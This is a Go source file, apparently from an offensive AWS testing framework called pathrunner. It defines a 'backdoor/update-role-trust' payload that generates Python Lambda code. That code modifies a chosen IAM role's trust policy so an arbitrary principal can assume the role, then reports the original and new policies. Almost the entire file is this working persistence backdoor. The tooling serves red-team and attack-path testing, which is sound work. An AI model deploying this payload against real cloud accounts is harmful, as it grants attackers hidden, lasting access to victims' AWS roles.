package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type BackdoorUpdateRoleTrustPayload struct{}

func init() {
	payloads.Register(&BackdoorUpdateRoleTrustPayload{})
}

func (p *BackdoorUpdateRoleTrustPayload) GetName() string {
	return "backdoor/update-role-trust"
}

func (p *BackdoorUpdateRoleTrustPayload) GetDescription() string {
	return "Update a role's trust policy to add a trusted principal"
}

func (p *BackdoorUpdateRoleTrustPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
		payloads.TagTransportResponse,
	}
}

func (p *BackdoorUpdateRoleTrustPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ROLE",
			Description: "IAM role name or ARN whose trust policy will be modified",
			Required:    true,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Principal to add to the trust policy (ARN, account ID, or service like lambda.amazonaws.com)",
			Required:    true,
		},
	}
}

func (p *BackdoorUpdateRoleTrustPayload) Validate(options map[string]string) error {
	if options["TARGET_ROLE"] == "" {
		return fmt.Errorf("TARGET_ROLE is required for backdoor/update-role-trust payload")
	}
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/update-role-trust payload")
	}
	return nil
}

func (p *BackdoorUpdateRoleTrustPayload) GenerateCode(options map[string]string) (string, error) {
	code := `import json
import boto3
import os

def lambda_handler(event, context):
    iam = boto3.client('iam')

    target_role = os.environ.get('TARGET_ROLE', '')
    trust_principal = os.environ.get('TRUST_PRINCIPAL', '')

    # Extract role name from ARN if provided
    role_name = target_role
    if target_role.startswith('arn:'):
        if ':role/' in target_role:
            role_name = target_role.split(':role/')[-1]

    # Auto-detect principal type from format
    if trust_principal.endswith('.amazonaws.com'):
        principal_key = 'Service'
    else:
        principal_key = 'AWS'

    try:
        # Get the current trust policy
        role_response = iam.get_role(RoleName=role_name)
        current_policy = role_response['Role']['AssumeRolePolicyDocument']
        original_policy = json.dumps(current_policy, indent=2)

        # Append a new statement for the trusted principal
        new_statement = {
            'Effect': 'Allow',
            'Principal': {
                principal_key: trust_principal
            },
            'Action': 'sts:AssumeRole'
        }
        current_policy['Statement'].append(new_statement)

        # Update the trust policy
        iam.update_assume_role_policy(
            RoleName=role_name,
            PolicyDocument=json.dumps(current_policy)
        )

        return {
            'statusCode': 200,
            'body': json.dumps({
                'status': 'success',
                'message': f'Added {trust_principal} to trust policy of {role_name}',
                'role_name': role_name,
                'trust_principal': trust_principal,
                'principal_type': principal_key,
                'original_policy': original_policy,
                'new_policy': json.dumps(current_policy, indent=2)
            })
        }

    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({
                'status': 'error',
                'message': f'Failed to update trust policy: {str(e)}',
                'role_name': role_name
            })
        }
`

	return code, nil
}

func (p *BackdoorUpdateRoleTrustPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	targetRole := options["TARGET_ROLE"]
	roleName := targetRole
	if strings.HasPrefix(targetRole, "arn:") {
		if idx := strings.Index(targetRole, ":role/"); idx != -1 {
			roleName = targetRole[idx+len(":role/"):]
		}
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:trust-policy",
			Name:          fmt.Sprintf("trust-policy-%s", roleName),
			CleanupMethod: "iam:UpdateAssumeRolePolicy",
			Metadata: map[string]string{
				"role_name":       roleName,
				"trust_principal": options["TRUST_PRINCIPAL"],
			},
		},
	}
}

func (p *BackdoorUpdateRoleTrustPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Update Role Trust Policy Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Trust policy updated successfully!\n\n")

			if roleName, ok := parsedBody["role_name"].(string); ok {
				output.WriteString("Role: " + roleName + "\n")
			}

			if principal, ok := parsedBody["trust_principal"].(string); ok {
				output.WriteString("Added Principal: " + principal + "\n")
			}

			if principalType, ok := parsedBody["principal_type"].(string); ok {
				output.WriteString("Principal Type: " + principalType + "\n")
			}

			if originalPolicy, ok := parsedBody["original_policy"].(string); ok {
				output.WriteString("\nOriginal Trust Policy:\n" + originalPolicy + "\n")
			}

			if newPolicy, ok := parsedBody["new_policy"].(string); ok {
				output.WriteString("\nNew Trust Policy:\n" + newPolicy + "\n")
			}

		} else {
			output.WriteString("Failed to update trust policy\n")
			if message, ok := parsedBody["message"].(string); ok {
				output.WriteString("Error: " + message + "\n")
			}
		}
	}

	return output.String(), nil
}
